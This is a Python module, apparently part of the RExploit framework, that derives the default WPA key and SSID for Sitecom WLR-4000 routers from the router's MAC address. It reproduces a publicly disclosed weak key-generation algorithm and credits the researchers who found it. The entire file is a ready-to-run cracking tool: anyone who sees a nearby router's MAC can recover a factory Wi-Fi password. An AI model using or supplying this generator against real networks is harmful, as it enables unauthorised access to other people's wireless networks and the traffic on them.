# coding=utf-8
import binascii

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="Default WPA key generator for Sitecom WLR-4000",
            category="generator",
            authors={
                "Daniel Diez": "RExploit module",
                "Roberto Paleari and Alessandro Di Pinto": "Vulnerability discovery"
            },
            date="21/07/2015",
            cwe="CWE-310: Cryptographic Issues",
            targets=[
                "WLR-4000"
            ],
            references={
                "http://blog.emaze.net/2014/04/sitecom-firmware-and-wifi.html": "Emaze"
            },
            description="Generates default WPA key for Sitecom WLR-4000 routers."
        )

    def run(self, mac):
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")
        ssid = "Sitecom{0}".format(mac[6:].upper())
        key = self.generateKey(mac, "4000")
        return "{0} - {1}".format(key, ssid)

    def generateKey(self, mac, model):
        charsets = {
            "4000": (
                "23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ",
                "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"
            ),

            "4004": (
                "JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK",
                "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"
            ),
        }

        charset1, charset2 = charsets[model]
        mac = bytearray.fromhex(mac)

        val = int(binascii.hexlify(mac[2:6]), 16)

        magic1 = 0x98124557
        magic2 = 0x0004321a
        magic3 = 0x80000000

        offsets = []
        keyLength = 12
        for i in range(keyLength):
            if (val & 0x1) == 0:
                val ^= magic2
                val >>= 1
            else:
                val ^= magic1
                val >>= 1
                val |= magic3

            offset = val % len(charset1)
            offsets.append(offset)

        key = ""
        key += charset1[offsets[0]]

        for i in range(0, keyLength - 1):
            magic3 = offsets[i]
            magic1 = offsets[i + 1]

            if magic3 != magic1:
                magic3 = charset1[magic1]
            else:
                magic3 = (magic3 + i) % len(charset1)
                magic3 = charset2[magic3]
            key += magic3

        return key
